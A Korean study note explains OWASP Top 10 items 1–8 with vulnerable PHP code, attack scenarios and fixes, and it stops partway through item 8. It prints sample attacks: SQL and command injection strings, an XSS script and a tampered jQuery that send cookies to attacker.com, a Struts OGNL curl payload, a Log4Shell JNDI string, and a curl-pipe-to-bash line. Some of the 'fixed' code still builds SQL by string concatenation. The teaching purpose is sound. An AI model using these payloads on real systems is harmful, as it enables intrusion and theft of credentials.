# **2021 OWASP Top 10**

### 1. Broken Access Control, 취약한 접근 통제

**공격 방식**:

- 인증되지 않은 사용자가 권한이 필요한 리소스에 접근할 수 있다.
- 일반 사용자가 관리자 권한이 필요한 페이지를 열람하거나 기능을 실행할 수 있다.
- URL 매개변수(id, role 등)를 조작하여 다른 사용자의 정보를 조회하거나 수정할 수 있다.
- 클라이언트 측에서 권한 검사를 수행하여 이를 우회하는 공격이 가능하다.

<br>

**공격 시나리오**:

1. URL 조작을 통한 다른 사용자 정보 탈취의 경우

   웹 사이트에서 자신의 계정 정보만 볼 수 있어야 하는데, URL 매개변수를 변경하여 다른 사용자의 정보를 열람하는 공격이다.

   - 사용자가 자신의 프로필 페이지에 접근한다.

   ```bash
   GET /user/profile?id=1001
   ```

   - 공격자가 URL의 `id` 값을 변경하여 다른 사용자의 정보를 열람한다.

   ```bash
   GET /user/profile?id=1002
   ```

   - 서버에서 `id=1002`의 정보를 반환하는 경우, 공격자는 다른 사용자의 정보를 쉽게 조회할 수 있게 된다.

   <br>

   **취약한 코드 예시**

   ```php
   <?php
   // 사용자 정보 조회 API
   $id = $_GET['id']; // URL에서 ID를 직접 가져옴
   $sql = "SELECT * FROM users WHERE id = $id";
   $result = mysqli_query($conn, $sql);
   $user = mysqli_fetch_assoc($result);

   echo json_encode($user);
   ?>
   ```

   **문제점**

   - 서버가 로그인한 사용자의 `id`와 요청한 `id`가 일치하는지 확인하지 않는다.
   - 공격자는 단순히 `id` 값을 변경하는 것만으로 다른 사용자의 정보를 탈취 가능하다.

   <br>

   **방어 방법**:

   ```php
   <?php
   session_start();
   $user_id = $_SESSION['user_id']; // 로그인한 사용자의 ID

   $sql = "SELECT * FROM users WHERE id = ?";
   $stmt = $conn->prepare($sql);
   $stmt->bind_param("i", $user_id); // 세션에서 가져온 사용자 ID만 조회 가능
   $stmt->execute();
   $result = $stmt->get_result();
   $user = $result->fetch_assoc();

   echo json_encode($user);
   ?>
   ```

   - 로그인한 사용자의 `id`와 요청한 `id`가 일치하는지 확인한다.
   - SQL 바인딩을 사용하여 SQL Injection을 방지한다.

<br>
<br>

2. Privilege Escalation, 권한 상승 공격

   일반 사용자가 관리자 페이지에 접근하거나 관리자 권한을 획득하는 공격이다.

   일반 사용자가 `user` 역할을 가지고 있지만, 요청을 수정하여 `admin` 역할을 얻을 수 있는 경우가 존재한다.

   <br>

   **취약한 코드 예시**

   ```php
   <?php
   if ($_SESSION['role'] == 'admin') {
    echo "관리자 페이지에 접근할 수 있습니다.";
   } else {
    echo "접근 불가";
   }
   ?>
   ```

   **문제점**

   - 클라라이언트 측에서 세션 변수를 직접 변경할 가능성이 있다.
   - `role` 값이 클라이언트에서 조작될 경우 관리자 권한을 획득 가능하다.

   ```javascript
   document.cookie = "role=admin"; // 세션 조작
   ```

   이후 관리자 페이지에 다시 접속하면, 공격자가 관리자의 권한을 획득할 수 있다.

    <br>

   **방어 방법**:

   ```php
   <?php
   // 보안 강화된 접근 통제
   session_start();
   if (!isset($_SESSION['role']) || $_SESSION['role'] !== 'admin') {
       die("접근이 거부되었습니다.");
   }
   echo "관리자 페이지입니다.";
   ?>
   ```

   - 세션 값은 서버에서만 관리하며, 클라이언트에서 임의로 수정할 수 없도록 작성한다.
   - 중요한 데이터는 클라이언트에서 직접 조작할 수 없도록 HTTPOnly 속성을 추가한다.

<br>

**방어 방법 요약**

- 클라이언트 검증만 믿지 않기, 서버 측에서 권한 확인
- 세션 기반 검증 사용 (`$_SESSION` 활용)
- RBAC 및 PBAC 적용
- URL 및 입력값 검증 철저 (예: `id` 변경 시 본인 정보만 조회 가능하도록 제한)
- 관리자 페이지 별도 보호 (예: `/admin` 경로 접근 제한)

<br>
<br>

---

### 2. Cryptographic Failures, 암호화 실패

**공격 방식**:

1. 민감한 데이터가 암호화되지 않음

   - 비밀번호, 신용카드 정보, 개인 식별 정보(PII, Personally Identifiable Information) 등이 암호화되지 않은 상태로 저장되거나 전송된다.
   - 데이터베이스에 평문(Plaintext) 비밀번호 저장의 경우,

   ```sql
   INSERT INTO users (username, password) VALUES ('admin', '123456');
   ```

   - 공격자가 데이터베이스에 접근하면 모든 계정의 비밀번호를 쉽게 확인할 수 있다.

2. 취약한 암호화 알고리즘 사용

   - 보안이 약한 알고리즘(MD5, SHA-1, DES 등)을 사용하면 공격자가 쉽게 복호화 가능하다.
   - MD5로 해시된 비밀번호는 레인보우 테이블 공격(Rainbow Table Attack)에 취약하다.

   ```php
   $hashed_password = md5('mypassword'); // 취약한 해시 알고리즘
   ```

   - MD5는 빠른 해싱 알고리즘이므로 사전 공격(Dictionary Attack)과 레인보우 테이블 공격에 의해 쉽게 뚫릴 수 있다.

3. HTTPS 미사용 (데이터 평문 전송)

   - 로그인 요청, 결제 정보 등이 HTTP(비보안 프로토콜)로 전송되면 중간자 공격(Man-in-the-Middle, MITM)에 노출될 수 있다.
   - 로그인 요청이 HTTP로 전송된다.

   ```sql
   POST http://example.com/login
   Content-Type: application/x-www-form-urlencoded

   username=admin&password=123456
   ```

   - 공격자가 네트워크에서 이 요청을 가로채면 계정 정보가 노출된다.

4. 하드코딩된 키 또는 재사용된 암호화 키 사용
   - 암호화 키를 코드에 직접 포함하면 소스 코드 유출 시 전체 보안이 깨진다.
   - 소스 코드 내 하드코딩된 API 키 및 암호화 키의 경우,
   ```php
   $encryption_key = "my_secret_key"; // 보안 문제 발생 가능
   ```
   - 키가 유출되면 모든 암호화된 데이터가 복호화될 위험이 존재한다.

<br>

**공격 시나리오**:

1. 네트워크 스니핑을 통한 로그인 정보 탈취

   사용자가 HTTP를 통해 로그인 요청을 보낸다.

   ```pgsql
   POST http://example.com/login
   Content-Type: application/x-www-form-urlencoded

   username=admin&password=123456
   ```

   공격자는 같은 네트워크에 연결된 상태에서 Packet Sniffing을 통해 평문 데이터를 가로챈다.

   가로챈 데이터를 분석하여 사용자의 로그인 정보를 확인하고 계정 탈취가 가능하다.

   <br>

   **방어 방법**:

   - HTTPS (TLS 1.2 이상)를 사용하여 데이터를 암호화한다.
   - 모든 요청을 HTTP → HTTPS로 강제 리디렉션한다.
   - Strict-Transport-Security(HSTS) 헤더를 적용하여 HTTPS 연결을 강제한다.

   ```apache
   Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
   ```

   <br>

2. 취약한 암호화 알고리즘 사용으로 비밀번호 복호화

   웹 사이트가 사용자의 비밀번호를 MD5 또는 SHA-1 해시 알고리즘으로 저장한다.

   공격자가 데이터베이스에서 `5f4dcc3b5aa765d61d8327deb882cf99` 값을 발견한다.

   해시 값을 레인보우 테이블을 이용해 복호화하여 `password123`임을 확인한다.

   공격자는 탈취한 비밀번호를 이용해 사용자 계정에 접근 가능해진다.

   <br>

   **방어 방법**:

   - bcrypt, Argon2 같은 강력한 해시 알고리즘을 사용히고, 가능하면 최신 표준인 Argon2를 우선적으로 적용한다.
   - Salt(임의의 난수 값) 추가로 동일한 비밀번호라도 해시값이 다르게 저장되도록 한다.

   ```PHP
   // bcrypt 적용
   $password = "mypassword";
   $hashed_password = password_hash($password, PASSWORD_BCRYPT);
   ```

<br>
<br>

---

### 3. Injection, 인젝션 공격

: 사용자 입력값이 제대로 검증되지 않은 채 코드로 실행되는 보안 취약점을 악용하는 공격 기법

**공격 방식**:

- SQL Injection → 데이터베이스 조작
- XSS(Cross-Site Scripting) → 웹 페이지에서 악성 스크립트 실행
- Command Injection → 시스템 명령어 실행

<br>

**공격 시나리오**:

1. SQL Injection

   - SQL 쿼리에 사용자의 입력값이 직접 포함될 때 발생한다.
   - 공격자는 입력값을 조작하여 데이터를 조회, 수정, 삭제하거나 관리자의 권한을 탈취할 수 있다.

   - 인증 우회(로그인 우회)의 경우,

     ```php
     <?php
     $id = $_POST['id'];
     $pw = $_POST['pw'];

     $query = "SELECT * FROM users WHERE id = '$id' AND pw = '$pw'";
     $result = mysqli_query($conn, $query);
     ?>
     ```

     - 위 코드는 사용자의 입력을 검증 없이 SQL 문에 직접 포함하여 취약점이 발생한다.

     ```sql
     ' OR '1'='1' --
     ```

     - 공격자는 다음과 같은 값을 입력한다.

     ```sql
     SELECT * FROM users WHERE id = '' OR '1'='1' -- ' AND pw = ''
     ```

     - `'1'='1'` 조건이 항상 참이 되므로 비밀번호 검증 없이 로그인이 가능해진다.

      <br>

     **방어 방법**:

     ```php
     <?php
     $stmt = $conn->prepare("SELECT * FROM users WHERE id = ? AND pw = ?");
     $stmt->bind_param("ss", $_POST['id'], $_POST['pw']);
     $stmt->execute();
     $result = $stmt->get_result();
     ?>
     ```

     - Prepared Statement를 사용하여 SQL Injection 공격을 방어할 수 있다.
     - `?` 플레이스홀더를 사용하여 사용자 입력을 안전하게 처리한다.

   <br>

   - 데이터 탈취의 경우,

     ```sql
     1 UNION SELECT username, password FROM users --
     ```

     ```sql
     SELECT * FROM products WHERE id = 1 UNION SELECT username, password FROM users --
     ```

     - 그 결과 DB의 `users` 테이블에서 모든 계정 정보가 노출된다.

      <br>

     **방어 방법**:

     ```php
     <?php
     // PHP에서 ORM (예: Laravel의 Eloquent) 사용
     $user = User::where('id', $id)->first();
     ?>
     ```

     - ORM을 사용하면 직접 SQL 쿼리를 작성하지 않고도 안전하게 데이터베이스를 조회할 수 있다.

<br>

2. XSS (Cross-Site Scripting)

   - 사용자가 입력한 값이 필터링되지 않고 그대로 웹 페이지에 출력될 때 발생한다.
   - 공격자는 악성 스크립트를 삽입하여 사용자의 세션 탈취, 피싱 공격 등을 수행할 수 있다.

   - 쿠키 탈취의 경우,

     ```php
     <?php
     echo "<p>".$_GET['message']."</p>";
     ?>
     ```

     - 취약한 코드는 위와 같다.

     ```html
     <script>
       document.location =
         "http://attacker.com/steal.php?cookie=" + document.cookie;
     </script>
     ```

     - 사용자의 로그인 쿠키가 `attacker.com` 으로 전송되며, 계정 탈취가 가능해진다.

      <br>

     **방어 방법**:

     ```php
     <?php
     echo "<p>" . htmlspecialchars($_GET['message'], ENT_QUOTES, 'UTF-8') . "</p>";
     ?>
     ```

     - `htmlspecialchars()`를 사용하면 HTML 태그가 일반 문자열로 변환되어 스크립트 실행이 차단된다.

      <br>

     ```html
     <meta
       http-equiv="Content-Security-Policy"
       content="default-src 'self'; script-src 'self'" />
     ```

     - 외부 스크립트 실행을 제한하여 XSS 공격을 방어할 수 있다.

<br>

3. Command Injection

   - 웹 애플리케이션이 시스템 명령어를 실행할 때 사용자의 입력을 직접 포함할 경우 발생한다.
   - 공격자는 임의의 명령어를 실행하여 서버를 제어할 수 있다.

   - 시스템 명령어 실행의 경우,

     ```php
     <?php
     $ip = $_GET['ip'];
     echo shell_exec("ping -c 4 " . $ip);
     ?>
     ```

     ```php
     127.0.0.1; cat /etc/passwd
     ```

     ```bash
     ping -c 4 127.0.0.1; cat /etc/passwd
     ```

     - `/etc/passwd` 파일이 출력되면서 서버 사용자 계정 정보가 노출될 수 있다.

      <br>

     **방어 방법**:

     ```php
     <?php
     $ip = escapeshellarg($_GET['ip']);
     echo shell_exec("ping -c 4 " . $ip);
     ?>
     ```

     - `escapeshellarg()`를 사용하면 사용자 입력값을 하나의 안전한 인자로 처리하여 명령어 삽입을 방지할 수 있다.

     ```php
     <?php
     if (preg_match('/^[0-9\.]+$/', $_GET['ip'])) {
        $ip = $_GET['ip'];
        echo shell_exec("ping -c 4 " . $ip);
     } else {
        echo "잘못된 입력입니다.";
     }
     ?>
     ```

     - 정규식을 사용하여 숫자와 점만 허용한다.
     - IP 주소 형식이 아닌 입력을 차단한다.

<br>
<br>

---

### 4. Insecure Design, 취약한 설계

보안이 충분히 고려되지 않은 시스템 설계로 인해 발생한다.

단순한 구현상의 실수가 아닌, 보안 요소가 설계 단계에서부터 반영되지 않은 경우를 포함한다.

일반적으로 비즈니스 로직의 허점을 악용하는 방식으로 이루어진다.

<br>

**공격 방식**:

- 비즈니스 로직 취약점: 설계 단계에서 보안 검토 없이 기능을 추가하여 사용자가 의도치 않게 시스템을 조작할 수 있도록 한다.
- 권한 관리 오류: 특정 사용자만 사용해야 하는 기능을 검증하지 않아, 일반 사용자가 관리자 권한을 수행할 수 있도록 허용된다.
- 데이터 검증 부족: 클라이언트에서 전달된 데이터를 제대로 검증하지 않아 악용될 가능성이 있다.

<br>

**공격 시나리오**:

1. 쿠폰 중복 사용 공격

   ```php
   // 사용자가 쿠폰을 적용하는 API
   $userId = $_SESSION['user_id'];
   $couponCode = $_POST['coupon_code'];

   // 쿠폰이 존재하는지 확인
   $query = "SELECT * FROM coupons WHERE code = '$couponCode' AND is_used = 0";
   $result = mysqli_query($conn, $query);
   if (mysqli_num_rows($result) > 0) {
      // 쿠폰 사용 처리
      $updateQuery = "UPDATE coupons SET is_used = 1 WHERE code = '$couponCode'";
      mysqli_query($conn, $updateQuery);
      echo "쿠폰이 적용되었습니다.";
   } else {
      echo "잘못된 쿠폰이거나 이미 사용되었습니다.";
   }
   ```

   - 쿠폰 사용을 처리하는 과정에서 트랜잭션이 없으며, 동시 요청이 발생하면 중복 적용이 가능하다.
   - 쿠폰을 사용자와 연결하는 정보가 부족하여, 다른 사용자의 쿠폰을 사용할 수도 있다.

   <br>

   **방어 방법**:

   - 쿠폰을 특정 사용자에게 매칭하여 등록하도록 설계한다.
   - 데이터베이스 트랜잭션을 적용하여 동시 요청을 방지한다.
   - 쿠폰 사용 로직에서 추가적인 검증을 수행한다.

   ```php
   // 트랜잭션 시작
   mysqli_begin_transaction($conn);

   $userId = $_SESSION['user_id'];
   $couponCode = $_POST['coupon_code'];

   // 쿠폰이 해당 사용자에게 속하는지 확인하고 사용되지 않았는지 검사
   $query = "SELECT * FROM coupons WHERE code = ? AND user_id = ? AND is_used = 0 FOR UPDATE";
   $stmt = mysqli_prepare($conn, $query);
   mysqli_stmt_bind_param($stmt, "si", $couponCode, $userId);
   mysqli_stmt_execute($stmt);
   $result = mysqli_stmt_get_result($stmt);

   if (mysqli_num_rows($result) > 0) {
      // 쿠폰 사용 처리
      $updateQuery = "UPDATE coupons SET is_used = 1 WHERE code = ?";
      $stmt = mysqli_prepare($conn, $updateQuery);
      mysqli_stmt_bind_param($stmt, "s", $couponCode);
      mysqli_stmt_execute($stmt);

      // 트랜잭션 커밋
      mysqli_commit($conn);
      echo "쿠폰이 적용되었습니다.";
   } else {
      // 트랜잭션 롤백
      mysqli_rollback($conn);
      echo "잘못된 쿠폰이거나 이미 사용되었습니다.";
   }
   ```

<br>

2. 관리자 권한 상승 공격

   ```php
   // 사용자의 프로필 정보를 가져오는 API
   $userId = $_GET['user_id'];
   $query = "SELECT * FROM users WHERE id = $userId";
   $result = mysqli_query($conn, $query);
   $userData = mysqli_fetch_assoc($result);
   ```

   - `user_id`를 직접 입력받아 조회하는 방식으로, 공격자가 URL을 조작하여 다른 사용자의 정보도 조회 가능해진다.
   - 권한 검증 없이 요청을 처리한다.

      <br>

   **방어 방법**:

   - 현재 로그인한 사용자의 정보만 조회하도록 제한한다.
   - 인증된 사용자 ID를 세션에서 가져오도록 수정한다.

   ```php
   // 현재 로그인한 사용자 정보만 가져오도록 제한
   $userId = $_SESSION['user_id'];
   $query = "SELECT * FROM users WHERE id = ?";
   $stmt = mysqli_prepare($conn, $query);
   mysqli_stmt_bind_param($stmt, "i", $userId);
   mysqli_stmt_execute($stmt);
   $result = mysqli_stmt_get_result($stmt);
   $userData = mysqli_fetch_assoc($result);
   ```

   <br>

3. 데이터 검증 부족으로 인한 계정 탈취

   ```php
   // 비밀번호 변경 API
   $userId = $_POST['user_id'];
   $newPassword = $_POST['new_password'];
   $query = "UPDATE users SET password = '$newPassword' WHERE id = $userId";
   mysqli_query($conn, $query);
   ```

   - `user_id`를 클라이언트에서 전달받아 조작이 가능하다.
   - 비밀번호를 해싱하지 않고 저장한다.

   <br>

   **방어 방법**:

   - 현재 로그인한 사용자의 ID를 세션에서 가져오도록 수정한다.
   - 비밀번호를 해싱하여 저장한다.

   ```php
   // 비밀번호 변경 API
   $userId = $_SESSION['user_id'];
   $newPassword = password_hash($_POST['new_password'], PASSWORD_BCRYPT);
   $query = "UPDATE users SET password = ? WHERE id = ?";
   $stmt = mysqli_prepare($conn, $query);
   mysqli_stmt_bind_param($stmt, "si", $newPassword, $userId);
   mysqli_stmt_execute($stmt);
   ```

<br>
<br>

### 5. Security Misconfiguration, 보안 설정 오류

**공격 방식**:

- 기본 관리자 계정 및 비밀번호 미변경
- 디버그 모드가 활성화된 상태로 운영
- 불필요한 포트 및 서비스 노출

<br>

**공격 시나리오**:

1. 기본 관리자 계정 및 비밀번호 미변경

   공격자는 웹 에플리케이션의 관리 페이지(`/admin`)에 접근하여
   기본 제공 계정 (`admin:admin`)을 사용해 로그인한다.

   <br>

   **방어 방법**:

   - 기본 계정을 삭제하고, 새로운 관리자 계정을 생성한다.
   - 강력한 비밀번호 정책을 적용하여 짧거나 쉬운 비밀번호 사용을 방지한다.
   - 계정 잠금 기능을 추가하여 여러 번 로그인 실패 시 계정을 비활성화한다.

   ```php
   // 비밀번호 해싱 및 강력한 비밀번호 적용
   $password = "Admin123!";
   $hashedPassword = password_hash($password, PASSWORD_BCRYPT);

   // 비밀번호 검증
   if (password_verify($_POST['password'], $hashedPassword)) {
      echo "로그인 성공";
   } else {
      echo "로그인 실패";
   }
   ```

<br>

2. 디버그 모드가 활성화된 상태로 운영

   공격자는 애플리케이션이 디버그 모드가 활성화된 상태에서 실행되는 것을 발견하고,
   오류 메세지를 통해 데이터베이스 연결 정보 또는 시스템 구조를 파악한다.

   <br>

   **방어 방법**:

   - 운영 환경에서는 디버그 모드를 비활성화한다.
   - 환경 변수 파일 (`.env`)을 사용하여 디버그 모드를 제어한다.

   ```php
   // .env 파일 설정
   DEBUG=false

   // PHP에서 디버그 모드 비활성화
   $debug = getenv('DEBUG');
   if ($debug === 'true') {
      ini_set('display_errors', 1);
      error_reporting(E_ALL);
   } else {
      ini_set('display_errors', 0);
      error_reporting(0);
   }
   ```

<br>

3. 불필요한 포트 및 서비스 노출

   공격자는 서버에서 실행 중인 불필요한 서비스 및 포트를 스캔하고,
   해당 포트를 통해 서버에 접근할 수 있는 취약점을 탐색한다.

   <br>

   **방어 방법**:

   - 사용하지 않는 포트 및 서비스를 비활성화한다.
   - 방화벽을 설정하여 외부 접근을 차단한다.
   - `iptables` 또는 `UFW`를 사용하여 접근 제어를 강화한다.

   ```sh
   # UFW 방화벽을 사용하여 22번 포트(SSH)만 허용
   sudo ufw default deny incoming
   sudo ufw allow 22/tcp
   sudo ufw enable
   ```

   ```apache
   # Apache 설정 파일에서 특정 IP만 관리자 페이지 접근 가능하도록 설정
   <Directory /var/www/html/admin>
      Require ip 192.168.1.100
   </Directory>
   ```

<br>
<br>

---

### 6. Vulnerable and Outdated Components, 취약하고 오래된 구성 요소 사용

**공격 방식**:

- 오래된 라이브러리 및 프레임 워크 사용
- 알려진 보안 취약점이 있는 버전 사용
- 보안 패치가 적용되지 않은 소프트웨어 실행
- 의존성 업데이트 미비로 인해 공격자가 취약점을 악용할 가능성 증가

<br>

**공격 시나리오**:

1. Apache Struts 원격 코드 실행 (RCE)

   - Apache Struts 2의 특정 버전에는 원격 코드 실행 취약점이 존재한다.
   - 공격자는 악의적인 입력을 통해 서버에서 임의의 명령을 실행할 수 있다.

   ```bash
   # 공격자가 악성 페이로드를 전송하여 서버에서 임의의 명령을 실행
   curl -X POST -H "Content-Type: application/json" \
      --data '{"name":"%{(#_memberAccess["allowStaticMethodAccess"]=true).(#cmds=("/bin/bash","-c","cat /etc/passwd")).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.start())}"}' \
      http://target.com/vulnerable-endpoint
   ```

   <br>

   **방어 방법**:

   - 최신 보안 패치를 적용한다. (Apache Struts의 최신 버전으로 업그레이드)
   - 입력값 검증 및 필터링을 적용한다.
   - WAF(Web Application Firewall) 설정으로 악성 요청을 차단한다.

<br>

2. jQuery 취약점 (XSS, Prototype Pollution)

   오래된 jQuery 버전은 XSS 및 프로토타입 오염 공격에 취약할 수 있다.

   ```html
   <script src="https://code.jquery.com/jquery-1.8.3.min.js"></script>
   <script>
     $.getScript("http://attacker.com/malicious.js");
   </script>
   ```

   <br>

   **방어 방법**

   - 최신 버전의 jQuery를 사용한다.
   - 콘텐츠 보안 정책(Content Security Policy, CSP)을 적용한다.
   - 외부 스크립트 로딩을 제한한다.

<br>

3. Log4j 취약점 (Log4Shell, CVE-2021-44228)

   Log4j 2.x 버전 중 일부는 원격 코드 실행 취약점을 포함하고 있어,
   공격자가 조작된 입력을 로그에 기록하게 하면 원격에서 코드를 실행할 수 있다.

   ```java
   logger.info("User agent: " + userInput);
   ```

   공격자가 `userInput` 값에 다음과 같은 악성 페이로드를 입력하면 서버에서 원격 코드 실행이 발생할 수 있다.

   ```bash
   ${jndi:ldap://malicious-server.com/exploit}
   ```

   <br>

   **방어 방법**

   - 최신 Log4j 버전으로 업그레이드한다.
   - `log4j2.formatMsgNoLookups=true` 설정으로 JNDI 조회를 비활성화한다.
   - `log4j-core`가 불필요하면 제거한다.

<br>

**방어 방법 요약**

1. 보안 패치 및 업데이트

   - 최신 프레임워크, 라이브러리, 소프트웨어를 사용한다.
   - 자동 업데이트 또는 정기적인 보안 점검을 시행한다.

2. 의존성 검사 및 취약점 분석

   - `npm audit`, `yarn audit`, `composer audit`, `pip-audit` 등의 도구를 사용한다.
   - OWASP Dependency-Check, Snyk, GitHub Dependabot을 활용한다.

3. 입력값 검증 및 필터링

   - 사용자 입력값을 신뢰하지 않고 철저한 검증을 수행한다.
   - WAF(Web Application Firewall)을 적용한다.

4. 불필요한 기능 제거
   - 사용하지 않는 플러그인, 라이브러리, 패키지를 제거한다.
   - 기본적으로 보안 설정을 강화하고, 필요할 때만 기능을 활성화한다.

<br>
<br>

---

### 7. Identification and Authentication Failures, 인증 및 식별 실패

**공격 방식**:

- 취약한 비밀번호 정책: 짧고 단순한 비밀번호를 사용할 수 있으며, 복잡도 요구 조건이 없을 때때 발생한다.

- Multi-Factor Authentication (MFA) 미사용: 비밀번호 외 추가 인증이 없어 공격자가 쉽게 계정을 탈취할 수 있다.

- Brute Force 공격 가능: 무차별 대입 공격이나 사전 대입 공격을 시도할 가능성이 있다.

<br>

**공격 시나리오**:

1. 취약한 비밀번호 정책

   사용자가 너무 쉬운 비밀번호로 설정할 수 있도록 허용하는 경우,

   ```php
   // 비밀번호 저장 (보안 취약)
   $password = $_POST['password'];
   $hashedPassword = md5($password); // MD5 사용 (보안 취약)
   $query = "INSERT INTO users (username, password) VALUES ('user', '$hashedPassword')";
   mysqli_query($conn, $query);
   ```

   - `md5()`와 같은 취약한 해시 함수를 사용한다.
   - 비밀번호 복잡성 검증이 없다.

   <br>

   **방어 방법**

   - 강력한 비밀번호 정책을 적용한다.
   - 안전한 해싱 알고리즘을 사용한다. (예: bcrypt, Argon2)
   - 비밀번호 최소 길이 및 복잡성 요구사항을 적용한다.

   ```php
   // 비밀번호 복잡성 검사
   function isStrongPassword($password) {
      return preg_match('/^(?=.*[A-Za-z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/', $password);
   }

   // 비밀번호 저장 (보안 적용)
   $password = $_POST['password'];

   if (!isStrongPassword($password)) {
      die("비밀번호는 최소 8자 이상이며, 숫자, 문자, 특수 문자를 포함해야 합니다.");
   }

   $hashedPassword = password_hash($password, PASSWORD_BCRYPT);
   $query = "INSERT INTO users (username, password) VALUES ('user', '$hashedPassword')";
   mysqli_query($conn, $query);
   ```

   ```php
   // 위 정규식 설명:
   // (?=.*[A-Za-z])  → 최소 하나 이상의 영문 포함
   // (?=.*\d)        → 최소 하나 이상의 숫자 포함
   // (?=.*[@$!%*?&]) → 최소 하나 이상의 특수 문자 포함
   // {8,}           → 최소 8자 이상
   ```

<br>

2. Multi-Factor Authentication (MFA) 미사용

   공격자가 유출된 비밀번호를 사용하여 로그인하는 경우,

   ```php
   // 단순 로그인 확인 (보안 취약)
   $username = $_POST['username'];
   $password = $_POST['password'];

   $query = "SELECT * FROM users WHERE username = '$username'";
   $result = mysqli_query($conn, $query);
   $user = mysqli_fetch_assoc($result);

   if ($user && password_verify($password, $user['password'])) {
      echo "로그인 성공!";
   } else {
      echo "로그인 실패!";
   }
   ```

   - 비밀번호만으로 로그인을 허용하는 단순 인증 방식식이다.
   - 추가적인 보안 조치(MFA, 로그인 제한 등)가 적용되지 않았다.

   <br>

   **방어 방법**:

   - 이메일 또는 SMS 기반 2FA를 적용한다.
   - OTP와 같이 일회용 비밀번호를 사용한다.
   - 인증 앱과 연동한다. (예: Google Authenticator, Authy)

   ```php
   require 'vendor/autoload.php';
   use OTPHP\TOTP;

   // MFA 코드 생성
   $totp = TOTP::create();
   $secret = $totp->getSecret(); // 사용자가 QR코드로 등록할 키
   echo "QR 코드 등록: " . $totp->getProvisioningUri();

   // 로그인 시 MFA 확인
   $enteredCode = $_POST['mfa_code'];

   if ($totp->verify($enteredCode)) {
      echo "MFA 인증 성공!";
   } else {
      echo "MFA 인증 실패!";
   }
   ```

<br>

3. Brute Force 공격

   로그인 시도 횟수를 제한하지 않으면 공격자가 무차별 대입 공격을 수행할 수 있다.

   ```php
   // 무차별 대입 공격 가능 (보안 취약)
   $username = $_POST['username'];
   $password = $_POST['password'];

   $query = "SELECT * FROM users WHERE username = '$username'";
   $result = mysqli_query($conn, $query);
   $user = mysqli_fetch_assoc($result);

   if ($user && password_verify($password, $user['password'])) {
      echo "로그인 성공!";
   } else {
      echo "로그인 실패!";
   }
   ```

   - 로그인 실패 횟수 제한이 없다.
   - 자동화된 공격(Bot) 방어 기능이 없다.

   <br>

   **방어 방법**:

   - 로그인 실패 횟수를 제한한다.
   - reCAPTCHA 혹은 CAPTCHA를 적용한다.
   - IP 기반 로그인 시도를 감지 및 차단한다.

   ```php
   session_start();
   $maxAttempts = 5;
   $lockoutTime = 300; // 5분

   if (!isset($_SESSION['login_attempts'])) {
      $_SESSION['login_attempts'] = 0;
      $_SESSION['last_attempt_time'] = time();
   }

   // 로그인 실패 횟수 확인
   if ($_SESSION['login_attempts'] >= $maxAttempts && (time() - $_SESSION['last_attempt_time']) < $lockoutTime) {
      die("로그인 시도가 너무 많습니다. 잠시 후 다시 시도하세요.");
   }

   $username = $_POST['username'];
   $password = $_POST['password'];

   $query = "SELECT * FROM users WHERE username = '$username'";
   $result = mysqli_query($conn, $query);
   $user = mysqli_fetch_assoc($result);

   if ($user && password_verify($password, $user['password'])) {
      $_SESSION['login_attempts'] = 0; // 성공 시 초기화
      echo "로그인 성공!";
   } else {
      $_SESSION['login_attempts']++;
      $_SESSION['last_attempt_time'] = time();
      echo "로그인 실패!";
   }
   ```

<br>
<br>

---

### 8. Software and Data Integrity Failures, 소프트웨어 및 데이터 무결성 실패

: 소프트웨어 및 데이터 무결성 실패는 코드 또는 데이터가 무단으로 변경되는 보안 취약점

**공격 방식**:

- 코드 또는 데이터가 무단으로 변경됨
- 악성 업데이트 파일 다운로드
- 서드파티 리소스의 변조

<br>

**공격 시나리오**:

1. 변조된 서드파티 라이브러리 로드

   애플리케이션이 외부 CDN에서 자바스크립트 라이브러리를 로드하는 경우,
   공격자가 CDN을 해킹하여 악성 코드가 포함된 라이브러리를 제공할 수 있다.

   ```html
   <!-- 공격자가 변조한 악성 라이브러리 -->
   <script src="https://cdn.example.com/jquery.min.js"></script>
   ```

   위 스크립트가 포함된 `jquery.min.js`가 공격자에 의해 변조되었다면,
   악성코드가 실행될 수 있다.

   ```javascript
   // 공격자가 변조한 jQuery 파일 (악성 코드 추가)
   (function () {
     $.get("https://attacker.com/steal-cookie?data=" + document.cookie);
   })();
   ```

   <br>

   **방어 방법**:

   1. Subresource Integrity(SRI) 적용

      - 특정 해시 값과 일치하는 파일만 로드되도록 설정하여 무결성을 검증한다.
      - 파일이 변경되면 로드가 차단된다.

      ```html
      <script
        src="https://cdn.example.com/jquery.min.js"
        integrity="sha384-o3ABX5Yk...generatedhash"
        crossorigin="anonymous"></script>
      ```

   2. 신뢰할 수 있는 출처에서만 라이브러리 로드

      - 가능하면 외부 CDN 대신 자체 서버에서 라이브러리를 관리하는 것이 안전하다.

<br>

2. 악성 업데이트 파일 다운로드 및 실행

   사용자가 공식적인 업데이트 경로가 아닌 출처에서 업데이트를 다운로드하고 실행하면
   공격자가 악성 업데이트를 배포할 수 있다.

   ```bash
   curl -s https://malicious-site.com/update.sh | bash
   ```

   위 명령어를 실행하면, 악성 사이트에서 다운로드한 `update.sh` 파일이 실행되며 시스템이 감염될 수 있다.

   <br>

   **방어 방법**:

   1. 업데이트 파일의 무결성 검증(SHA256 해시 체크)

      - 다운로드한 파일이 변조되지 않았는지 확인한다.

      ```bash
      wget https://trusted-site.com/update.sh
      echo "expected_hash_value  update.sh" | sha256sum -c
      ```

   2. 업데이트 서명 검증 (GPG 서명 사용)

      - 신뢰할 수 있는 소스에서 제공하는 GPG 서명을 사용하여 파일의 무결성을 검증한다.

      ```bash
      gpg --verify update.sh.sig update.sh
      ```

<br>

3. 코드 저장소(repo) 변조 및 공급망 공격

   공격자가 개발자의 코드 저장소(GitHub, GitLab 등)를 해킹하거나
   의존성을 변조하여 악성 코드를 포함한 패키지를 배포할 수 있다.

   ```json
   {
     "dependencies": {
       "some-library": "https://malicious-site.com/some-library.tgz"
     }
   }
   ```

   위처럼 신뢰할 수 없는 출처에서 패키지를 다운로드하면, 악성 코드가 실행될 위험이 있다.

   <br>

   **방어 방법**:

   1. 패키지 서명 및 무결성 검증

      - npm, pip, composer 등 패키지 관리자에서 공식 서명된 패키지만 설치한다.

      ```bash
      npm audit fix
      composer install --prefer-dist
      ```

   2. Git 저장소 보호 (Signed Commits & 2FA 사용)

